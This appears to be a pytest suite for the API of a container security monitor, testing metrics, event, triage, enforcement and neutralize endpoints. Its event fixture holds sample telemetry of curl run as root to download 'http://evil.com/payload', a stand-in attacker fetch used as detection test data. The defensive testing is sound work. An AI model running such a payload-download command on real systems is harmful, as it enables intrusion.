#!/usr/bin/env python3
"""
Test suite for the Sentinel-Core Forwarder FastAPI endpoints.

Run with:
    PYTHONPATH=. pytest forwarder/tests/test_api.py -v
"""

import pytest
from fastapi.testclient import TestClient
from forwarder.api import app, record_event, _recent_events, _metrics, _lock


@pytest.fixture(autouse=True)
def reset_state():
    """Reset shared state before every test."""
    with _lock:
        _recent_events.clear()
        _metrics["events_total"] = 0
        _metrics["events_by_type"] = {}
        _metrics["severity_breakdown"] = {"critical": 0, "high": 0, "medium": 0, "low": 0}
        _metrics["errors_total"] = 0
        _metrics["active_alerts"] = 0
        _metrics["events_per_second"] = 0.0
        _metrics["last_event_timestamp"] = None
    yield


@pytest.fixture
def client():
    return TestClient(app)


def _make_event(
    binary="curl",
    grade="TP",
    confidence=0.92,
    event_id="evt-001",
    severity=None,
    event_type="process_exec",
):
    """Build a minimal event dict understood by record_event."""
    ev = {
        "event_id": event_id,
        "event_type": event_type,
        "timestamp": "2026-03-07T12:00:00Z",
        "severity": severity,
        "telemetry": {
            "binary": f"/usr/bin/{binary}",
            "pod": "test-pod",
            "namespace": "default",
            "pid": 1234,
            "user": "root",
            "args": ["-O", "http://evil.com/payload"],
        },
        "triage": {"grade": grade, "confidence": confidence},
        "explanation": {"guidance": "Block immediately"},
    }
    return ev


# ── Health ────────────────────────────────────────────────────────

class TestHealth:
    def test_health(self, client):
        r = client.get("/api/health")
        assert r.status_code == 200
        d = r.json()
        assert d["status"] == "ok"
        assert d["version"] == "1.0.0"


# ── Metrics ───────────────────────────────────────────────────────

class TestMetrics:
    def test_metrics_empty(self, client):
        r = client.get("/api/metrics")
        assert r.status_code == 200
        d = r.json()
        assert d["events_total"] == 0
        assert d["severity_breakdown"]["critical"] == 0

    def test_metrics_after_event(self, client):
        record_event(_make_event(severity="critical"))
        r = client.get("/api/metrics")
        d = r.json()
        assert d["events_total"] == 1
        assert d["severity_breakdown"]["critical"] == 1


# ── Events ────────────────────────────────────────────────────────

class TestEvents:
    def test_events_empty(self, client):
        r = client.get("/api/events")
        assert r.status_code == 200
        assert r.json()["events"] == []

    def test_events_returns_recorded(self, client):
        record_event(_make_event(event_id="evt-100"))
        r = client.get("/api/events")
        events = r.json()["events"]
        assert len(events) == 1
        assert events[0]["event_id"] == "evt-100"

    def test_events_limit(self, client):
        for i in range(5):
            record_event(_make_event(event_id=f"evt-{i}"))
        r = client.get("/api/events?limit=2")
        assert len(r.json()["events"]) == 2


# ── Timeline ──────────────────────────────────────────────────────

class TestTimeline:
    def test_timeline_buckets(self, client):
        r = client.get("/api/events/timeline")
        assert r.status_code == 200
        buckets = r.json()["buckets"]
        assert len(buckets) == 30
        assert "timestamp" in buckets[0]
        assert "total" in buckets[0]


# ── Immunity Score ────────────────────────────────────────────────

class TestImmunityScore:
    def test_immunity_score_perfect_when_no_events(self, client):
        r = client.get("/api/immunity-score")
        d = r.json()
        assert d["score"] == 100
        assert d["total_events"] == 0

    def test_immunity_score_decreases_with_tp(self, client):
        for i in range(3):
            record_event(_make_event(event_id=f"tp-{i}", grade="TP"))
        r = client.get("/api/immunity-score")
        d = r.json()
        assert d["score"] == 85  # 100 - 3*5
        assert d["tp_count"] == 3


# ── Enforcement Mode ──────────────────────────────────────────────

class TestEnforcement:
    def test_toggle_enforcement(self, client):
        r = client.post("/api/enforcement/mode")
        assert r.status_code == 200
        assert "mode" in r.json()


# ── Cluster ───────────────────────────────────────────────────────

class TestCluster:
    def test_cluster(self, client):
        r = client.get("/api/cluster")
        assert r.status_code == 200
        d = r.json()
        assert d["name"] == "kind-sentinel-cluster"
        assert len(d["nodes"]) == 3
        roles = {n["role"] for n in d["nodes"]}
        assert "control-plane" in roles
        assert "worker" in roles


# ── Policies ──────────────────────────────────────────────────────

class TestPolicies:
    def test_policies(self, client):
        r = client.get("/api/policies")
        assert r.status_code == 200
        policies = r.json()["policies"]
        assert len(policies) >= 2
        names = {p["name"] for p in policies}
        assert "sentinel-full" in names


# ── Triage Stats ──────────────────────────────────────────────────

class TestTriageStats:
    def test_triage_stats_empty(self, client):
        r = client.get("/api/triage/stats")
        d = r.json()
        assert d["total_triaged"] == 0
        assert d["breakdown"]["TruePositive"] == 0

    def test_triage_stats_with_events(self, client):
        record_event(_make_event(event_id="tp1", grade="TP", confidence=0.9))
        record_event(_make_event(event_id="fp1", grade="FP", confidence=0.1))
        r = client.get("/api/triage/stats")
        d = r.json()
        assert d["total_triaged"] == 2
        assert d["breakdown"]["TruePositive"] == 1
        assert d["breakdown"]["FalsePositive"] == 1
        assert d["avg_confidence"] == 0.5


# ── Explain ───────────────────────────────────────────────────────

class TestExplain:
    def test_explain_missing_event(self, client):
        r = client.get("/api/explain/nonexistent")
        assert r.status_code == 200
        assert r.json()["error"] == "Event not found"

    def test_explain_existing_event(self, client):
        record_event(_make_event(event_id="evt-explain"))
        r = client.get("/api/explain/evt-explain")
        d = r.json()
        # Should return the mock reasoning data (no orchestrator result)
        assert "summary" in d or "error" not in d


# ── Neutralize ────────────────────────────────────────────────────

class TestNeutralize:
    def test_neutralize_missing(self, client):
        r = client.post("/api/neutralize/nonexistent")
        d = r.json()
        assert d["status"] == "Neutralized"
        assert d["event_id"] == "nonexistent"

    def test_neutralize_existing(self, client):
        record_event(_make_event(event_id="evt-neut"))
        r = client.post("/api/neutralize/evt-neut")
        d = r.json()
        assert d["status"] == "Neutralized"
        assert d["event_id"] == "evt-neut"


# ── Sentinel Analyze (POST) ──────────────────────────────────────

class TestSentinelAnalyze:
    def test_sentinel_analyze_post(self, client):
        ev = _make_event(event_id="evt-post")
        r = client.post("/api/sentinel/analyze", json=ev)
        assert r.status_code == 200
        assert r.json()["status"] == "ok"

        # Event should now appear in recent events
        r2 = client.get("/api/events")
        ids = [e["event_id"] for e in r2.json()["events"]]
        assert "evt-post" in ids


# ── WebSocket ─────────────────────────────────────────────────────

class TestWebSocket:
    def test_ws_connect_and_disconnect(self, client):
        with client.websocket_connect("/api/ws/events") as ws:
            # Just verify the connection opens and closes cleanly
            pass


# ── Root ──────────────────────────────────────────────────────────

class TestRoot:
    def test_root(self, client):
        r = client.get("/")
        assert r.status_code == 200
        assert "docs" in r.json()
